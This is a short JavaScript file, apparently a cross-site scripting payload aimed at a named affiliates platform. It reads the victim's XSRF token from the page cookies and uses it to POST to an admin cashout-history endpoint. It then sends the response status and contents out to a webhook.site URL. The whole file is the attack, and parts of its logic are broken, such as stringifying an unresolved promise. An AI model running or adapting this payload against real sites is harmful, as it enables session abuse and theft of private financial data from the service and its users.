const dataToSend = {
};

function getCookie(name) {
  const cookies = document.cookie.split('; ');
  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i];
    // Check if the cookie starts with the desired name and an equals sign
    if (cookie.startsWith(name + '=')) {
      // Return the value part of the cookie
      return cookie.substring(name.length + 1);
    }
  }
  return null; // Return null if the cookie is not found
}

fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  headers: {
        "XSRF-TOKEN-X": getCookie("XSRF-TOKEN-X"), 
        "Content-Type": "application/json"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});
